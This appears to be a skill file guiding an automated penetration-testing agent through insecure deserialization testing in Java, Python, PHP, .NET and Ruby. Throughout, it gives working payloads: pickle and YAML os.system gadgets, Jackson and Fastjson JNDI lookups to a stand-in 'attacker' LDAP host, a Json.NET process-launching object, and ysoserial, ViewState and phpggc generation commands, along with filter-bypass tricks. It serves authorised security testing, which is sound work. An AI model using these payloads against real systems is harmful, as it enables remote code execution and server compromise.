---
name: insecure-deserialization
description: Insecure deserialization testing for Java, Python, PHP, .NET, Ruby, and Node.js covering gadget chains, type confusion, and safe validation
---

# Insecure Deserialization

Insecure deserialization passes attacker-controlled byte streams or structured blobs to language-native unmarshal functions, enabling remote code execution, authentication bypass, and logic manipulation through magic methods and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens.

## Attack Surface

**Formats**
- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML), Hessian/Burlap, Kryo
- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
- PHP: `unserialize()`, Phar deserialization
- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
- Ruby: `Marshal.load`, YAML.load
- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)

**Transports and Containers**
- Java RMI/JMX, HTTP/RPC endpoints, messaging protocols, queues, signed wrappers, and product-specific binary envelopes can carry one or more formats above

**Input Locations**
- Cookies, session tokens, hidden form fields
- API parameters (`data`, `state`, `object`, base64 blobs)
- Message queues, WebSocket binary frames, file uploads
- Cache entries, database columns storing serialized objects

## Reconnaissance

**Detection Signals**
- Base64 blobs starting with magic bytes:
  - Java: `ac ed 00 05` (hex `rO0` base64)
  - PHP: `O:`, `a:`, `s:` prefixes after decode
  - .NET BinaryFormatter: starts with `00 01 00 00 00 ff ff ff ff`
- `Content-Type` with binary or custom serialization
- Framework indicators: Java apps with Spring, Struts, JSF; PHP with Symfony sessions

**White-Box Indicators**
```
pickle.loads    unserialize(    ObjectInputStream    BinaryFormatter
yaml.load       readObject(     TypeNameHandling    Marshal.load
```

## Key Vulnerabilities

### Java Deserialization

**Gadget Chains**
- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
- Tools: ysoserial (authorized testing only), manual chain selection by classpath

**Test Flow**
1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
2. Fingerprint library versions from errors, headers, or bundled libs
3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution

**Jackson / JSON Typing**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```
When `enableDefaultTyping()` (or `activateDefaultTyping`, or a field/`@JsonTypeInfo`
with `As.WRAPPER_ARRAY`/`PROPERTY`) lets the attacker name the concrete type,
Jackson instantiates it and populates its setters — the class above triggers a
JNDI lookup on construction. This is a **denylist-bypass technique class**, not
a single CVE: Jackson ships a `SubTypeValidator` blocklist of known-dangerous
classes, and each new gadget class discovered on some classpath (`c3p0`,
`JdbcRowSetImpl`, various `templates`/`ELProcessor`/scriptengine classes) is a
fresh bypass until added to the block list. Fingerprint the Jackson version and
match a gadget the deployed classpath exposes that its block list of *that*
version does not yet cover; do not assume a payload from one version works on
another.

**Fastjson / fastjson2 (`@type` autotype)** — the same battle in a different
library:
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/o","autoCommit":true}
```
`@type` names the class to instantiate. Fastjson's autotype has a long lineage
of denylist additions and bypasses (double-encoding the class name, `L...;`
descriptor wrapping, cache-poisoning the type cache, whitelisted-prefix abuse).
Treat it as version-specific: identify the exact Fastjson/fastjson2 version
(error strings, jar), then select a gadget + bypass documented for that build.
Load `dependency_cve_scanning` for the version→advisory mapping; there are many
CVEs across this lineage, so pin a number only after confirming it against the
deployed version.

**JNDI Pivots from Object Construction**

JNDI injection is not itself a serialization format. It becomes part of this workflow when an attacker-selected type, setter, or gadget performs `Context.lookup()` during object construction or property population. `JdbcRowSetImpl` and some historical polymorphic JSON chains are examples; Log4j lookups reach JNDI through a different input path and should not be classified as deserialization.

- Trace fields such as `dataSourceName`, `jndiName`, and `namingURL` into the exact lookup API and provider.
- Record the accepted schemes/provider factories (`ldap`, `ldaps`, `rmi`, DNS URL context, or application-specific naming providers). A `dns://` value is not a universal oracle; it works only when the relevant DNS provider and lookup path are present.
- Separate network lookup, remote object/reference processing, serialized LDAP attributes, remote codebase loading, and local object-factory invocation. Each is a different capability with different runtime controls.
- JEP 290 filters incoming Java serialization graphs; it does not disable JNDI remote codebase loading. JNDI providers gained separate remote-class-loading and serialized-data controls across JDK updates, and current JDKs disable remote code downloading by default. Record the exact JDK build and relevant provider properties instead of using a single “modern Java” rule.
- When remote class loading is unavailable, test whether the returned reference can reach a compatible **local** `ObjectFactory`, bean-property path, expression engine, script engine, or other class already present. Confirm exact class names, versions, module access, and trigger methods from the deployed classpath.

**Hessian / Burlap**
- Binary RPC formats deserialized by `HessianInput`/`Hessian2Input`. Attacker object graphs reach gadgets even though it is not native Java serialization.
- Treat serializer version, allowed type metadata, constructors/setters invoked, collection/comparator behavior, and classpath as independent prerequisites.
- Pair `semantic_confusion` when a proxy or route policy is expected to make the RPC endpoint unreachable.
- Inspect the exact deployed libraries rather than relying on generic gadget labels; similar-looking Spring, Resin, Tomcat, XBean, EL, or Groovy classes are not interchangeable.

### Python Pickle

Pickle executes arbitrary code during unpickling by design:
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```

**YAML** — the payload:
```yaml
!!python/object/apply:os.system ['id']
```
The vulnerable call is **version-dependent** (measured on PyYAML 6.0.3):
- **PyYAML ≥6.0**: `yaml.load(x)` with **no `Loader` raises `TypeError`** — it will not run at all. RCE needs `yaml.unsafe_load(x)` or `yaml.load(x, Loader=yaml.UnsafeLoader)` (measured: **executes**). `yaml.safe_load` raises `ConstructorError` on the `!!python/...` tag (safe).
- **PyYAML 5.1–5.x**: bare `yaml.load(x)` warns and defaults to `FullLoader` (blocks `apply`/`new` arbitrary calls, though `FullLoader` had its own historical bypasses).
- **PyYAML <5.1**: bare `yaml.load(x)` used the full unsafe loader → direct RCE.

So fingerprint the version and the *exact call*: on modern PyYAML the finding is `unsafe_load`/`Loader=Unsafe`, not a bare `yaml.load`. Also `!!python/object/new` and `!!python/object/apply` reach constructors/callables; `SafeLoader` blocks both.

**jsonpickle** — `jsonpickle.decode()` on untrusted JSON is RCE by design: a
`{"py/object": ...}`, `{"py/reduce": ...}`, or `{"py/type": ...}` directive
reconstructs arbitrary objects/callables. Grep for `jsonpickle.decode`.

**marshal / shelve** — `marshal.loads` executes code objects; `shelve` is
pickle-backed. Both are RCE on untrusted input.

### PHP unserialize()

**Object Injection**
- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
- POP chains through framework classes (Laravel, Symfony, WordPress plugins)

**Phar Stream Deserialization.** Any PHP function that takes a filesystem path and
stats or reads it parses phar metadata when the path starts with `phar://` — and
parsing that metadata calls `unserialize()` on it. This turns file-path operations
into deserialization sinks. Triggering functions include `file_exists`,
`file_get_contents`, `filesize`, `fopen`, `file`, `is_file`, `is_dir`, `stat`,
`md5_file`, and `getimagesize` — essentially anything that touches the file.
- **Sink surface**: any feature passing a user-controlled path to a filesystem
  function — file-preview, download, "does this file exist" validators,
  image/thumbnail pipelines.
- **Gadget requirement**: identical to any `unserialize` sink — the app or its
  Composer autoload set must hold a class whose magic method (`__wakeup`,
  `__destruct`, `__toString`, `__call`) is steerable by property values. `phpggc`
  catalogs chains for Laravel, Symfony, WordPress, Drupal, Magento, Guzzle,
  Monolog, and Slim.
- **Payload**: build a phar with `Phar`/`PharData`, `setMetadata(<serialized
  gadget>)`, then deliver it. **Extension is irrelevant** — phar detection reads
  the internal stub signature, not the name, so a phar renamed `.jpg`/`.png`/`.pdf`
  still triggers.
- **Delivery**: an upload endpoint that stores the file at a predictable path plus
  any path-taking function elsewhere; a traversal/redirect chain that lands user
  input in a filesystem call; or a parameter that accepts `phar://` directly when
  validation only blocks `http://`/`https://`.
- **Detection probes**: reference a nonexistent `phar:///tmp/x.phar` and watch for
  errors naming "phar"/"manifest"; upload a benign renamed phar and reference it
  through a path parameter, comparing behavior to a plain path; grep source for the
  triggering functions receiving user paths.
- **Version fingerprint (verified)**: as of **PHP 8.0** the `phar://` wrapper **no
  longer auto-unserializes** metadata on plain file operations. Measured on PHP
  8.4, `file_exists('phar://…')` does not fire a gadget's `__wakeup`, while an
  explicit `Phar::getMetadata()` still does (and `getMetadata([])` disables class
  loading). So on 8.0+ the sink needs an explicit `getMetadata()` call in the app;
  the file-operation auto-trigger only lands on PHP 7.x. Fingerprint the version
  (`X-Powered-By`, error output) before assuming the plain-file-op sink is live.

### .NET Deserialization

**Dangerous formatters** — `BinaryFormatter`, `LosFormatter`, `SoapFormatter`,
`NetDataContractSerializer`, `ObjectStateFormatter`, and `JavaScriptSerializer`
*with a `SimpleTypeResolver`* all deserialize attacker-named types → RCE with
`ysoserial.net` gadget chains (`TypeConfuseDelegate`, `WindowsIdentity`,
`ObjectDataProvider`, `PSObject`). `BinaryFormatter` is obsolete/removed in
.NET 9 but ubiquitous on .NET Framework.

**Json.NET (Newtonsoft)**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System",
 "StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}
```
Exploitable when `TypeNameHandling` is `Objects`, `Arrays`, `All`, or `Auto`
(anything but `None`) — the `$type` names the class to build. `ObjectDataProvider`
is the canonical gadget (invokes an arbitrary method). Same story for
`DataContractJsonSerializer`/`DataContractSerializer` with a known-type list an
attacker can influence.

**ViewState** — the highest-yield .NET deserialization on classic ASP.NET.
`__VIEWSTATE` is a `LosFormatter`/`ObjectStateFormatter` blob protected by a MAC
keyed on the machine key. If the machine key is **disabled** (`enableViewStateMac=false`,
legacy), **leaked** (web.config disclosure, `.git`, a hardcoded/default key), or
crackable, forge a gadget ViewState:
```bash
# needs the leaked validationKey/decryptionKey + algorithms from web.config
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc" \
  --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey=<hex> \
  --validationalg="SHA1" --validationkey=<hex>
```
Then POST it as `__VIEWSTATE`. Harvest machine keys from `web.config`,
`machine.config`, DVCS dumps, and known-default-key lists. Note `__VIEWSTATEGENERATOR`
and the target path/apppath must match for the MAC to validate.

### Ruby Marshal

- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)

## Advanced Techniques

**Signed Blob Bypass**
- If HMAC/signing uses weak secret or algorithm confusion, forge serialized payload
- Strip signature and test unsigned code paths
- Length extension on MAC if applicable (older custom schemes)

**Second-Order Deserialization**
- Store serialized blob in profile/import; trigger on admin export, cache warm, or batch job

**Compression Wrappers**
- Gzip/base64 nested encoding bypassing naive WAF inspection

## Testing Methodology

1. **Find sinks** — Locate decode/unmarshal calls on user-influenced data
2. **Confirm format** — Magic bytes, error stack traces, framework fingerprint
3. **Safe oracle** — DNS/HTTP OAST callback or sleep/ping before full RCE PoC
4. **Gadget selection** — Match classpath/runtime version to available chains
5. **Minimal PoC** — Demonstrate code execution or critical logic bypass with least destructive command
6. **Session/cookie focus** — Deserialize server-side session stores (Java, PHP) early

## Validation

1. Demonstrate attacker-controlled object graph reaches dangerous sink (unmarshal/readObject)
2. Show impact: RCE (bounded command), auth bypass object, or privilege field manipulation
3. Provide encoded payload and exact injection point (cookie name, parameter, header)
4. Confirm on fixed version or alternate instance that identical payload fails safely
5. Document library/version and gadget chain class names for remediation

## False Positives

- Base64 data is encrypted or signed with verified HMAC before deserialization
- Only primitive types deserialized (whitelist schema, no polymorphic types)
- `pickle`/`Marshal` not used; JSON parsed to dict without object instantiation
- Deserialization in isolated sandbox with no network/exec primitives (verify thoroughly)
- Error mentions serialization class but input is never passed to unmarshal (dead code path)

## Bypass Methods

- Encoding layers: base64 → gzip → serialize
- Alternative parameters storing same session (`session`, `session_backup`, `state`)
- Switch content-type or parameter location (GET vs POST vs cookie)
- Type confusion: JSON array vs object hitting different deserializer branches
- Unicode/UTF-7 smuggling in PHP serialized strings (legacy contexts)

## Impact

- Remote code execution on application servers
- Authentication bypass via forged session objects
- Privilege escalation through manipulated role/admin fields in deserialized classes
- Full application compromise in Java/PHP/.NET stacks with known gadget libraries

## Pro Tips

1. Always fingerprint versions before firing ysoserial — wrong chain wastes time and noise
2. Start with DNS/HTTP callback gadgets before command execution in production-like targets
3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, custom tokens
4. In white-box, trace from `readObject`/`unserialize`/`pickle.loads` backward to source
5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps
6. Model JNDI lookup, reference/object processing, remote codebase loading, and local factory invocation as separate stages
7. A "blocked" enterprise deserialization endpoint may still be reachable through a proxy/path-normalization mismatch — pair `semantic_confusion`

## Tooling

Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE or `php-cli` if you need the Java/PHP generators.

| Tool | Language / format | Use |
|------|-------------------|-----|
| **ysoserial** (frohoff) | Java native | Gadget-chain payloads: `CommonsCollections1-7`, `Groovy1`, `Spring1/2`, and `URLDNS` for a safe no-exec DNS oracle. Needs a JRE. |
| **phpggc** (ambionics) | PHP `unserialize` / Phar | Framework POP chains (Laravel, Symfony, WordPress, Drupal, Monolog). Needs `php-cli`. |
| **ysoserial.net** | .NET `BinaryFormatter` / Json.NET | Windows/.NET gadget payloads. Needs .NET/mono — usually out of scope in a Linux sandbox. |
| **marshalsec** | Java Hessian/Burlap, Kryo, JSON, and JNDI reference tooling | Use only from a reviewed, pinned upstream commit when a non-native Java marshaller requires it. It has no stable release and intentionally bundles historical gadget dependencies; do not treat it as a globally installed default tool. |

```
# Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0

# PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
./phpggc -b Laravel/RCE9 system id
```

Confirm the sink with a callback (`URLDNS` / interactsh OAST) before firing a command-exec chain, and match the chain to the fingerprinted library version — the wrong chain just adds noise.

## Summary

Treat every deserialization of untrusted data as critical. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens, or no custom serialization at all. Prove impact with callback or bounded execution — not just error stack traces.
